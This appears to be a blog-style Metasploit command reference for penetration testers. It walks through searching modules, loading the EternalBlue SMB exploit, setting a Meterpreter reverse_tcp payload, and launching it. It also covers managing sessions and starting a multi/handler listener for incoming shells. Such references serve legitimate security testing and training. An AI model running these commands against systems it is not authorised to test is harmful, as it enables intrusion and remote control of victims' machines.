---
title: Metasploit Command List
date: 2026-01-05
category: commands
enrich: false
tags: metasploit, cybersecurity, command reference
description: Top 10 essential commands for metasploit.
---

# Metasploit (msfconsole) Command Guide

**Metasploit** is the world's most used penetration testing framework. `msfconsole` is the main interface.

## Top 10 Useful Commands

### 1. Search Modules
```bash
msf6 > search type:exploit platform:windows smb
```
**Explanation:** Search for exploits matching specific criteria.

### 2. Select Module
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```
**Explanation:** Select a module to configure.

### 3. Show Options
```bash
msf6 > show options
```
**Explanation:** Display parameters needed (RHOSTS, LHOST, etc.).

### 4. Set Target/Payload
```bash
msf6 > set RHOSTS 10.10.10.10
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
**Explanation:** Configure the target IP and the payload to deliver.

### 5. Check Vulnerability
```bash
msf6 > check
```
**Explanation:** Verify if the target is vulnerable without exploiting it (if supported).

### 6. Exploit/Run
```bash
msf6 > exploit -j
```
**Explanation:** Launch attack. `-j` runs it in the background as a job.

### 7. Manage Sessions
```bash
msf6 > sessions -l
msf6 > sessions -i 1
```
**Explanation:** List active shells (`-l`) or interact (`-i`) with session ID 1.

### 8. Database Scan (Nmap)
```bash
msf6 > db_nmap -sV 10.10.10.10
```
**Explanation:** Run nmap and save results directly into the Metasploit database.

### 9. Create Workspace
```bash
msf6 > workspace -a ProjectX
```
**Explanation:** Isolate data into a named workspace.

### 10. Upgrade Shell
```bash
msf6 > sessions -u 1
```
**Explanation:** Attempt to upgrade a plain command shell to a Meterpreter session.

## The Most Powerful Command
```bash
msf6 > use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit -j
```
**Explanation:** Starts a generic "Listener" (Handler) to catch incoming shells from any manual payloads (created with msfvenom).

